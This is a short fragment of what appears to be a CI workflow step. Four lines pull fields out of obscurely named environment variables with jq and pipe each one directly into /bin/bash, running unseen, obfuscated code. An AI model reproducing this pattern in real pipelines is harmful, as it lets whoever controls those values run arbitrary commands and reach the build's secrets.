        run: |
          printf '%s' "$aua0" | jq -r .tf8308 | /bin/bash
          echo $dilfy284 | jq -r .cbfa96 | /bin/bash
          printf '%s' "$ebrfd713" | jq -r .ohvf3939 | /bin/bash
          echo $l18 | jq -r .f43238 | /bin/bash

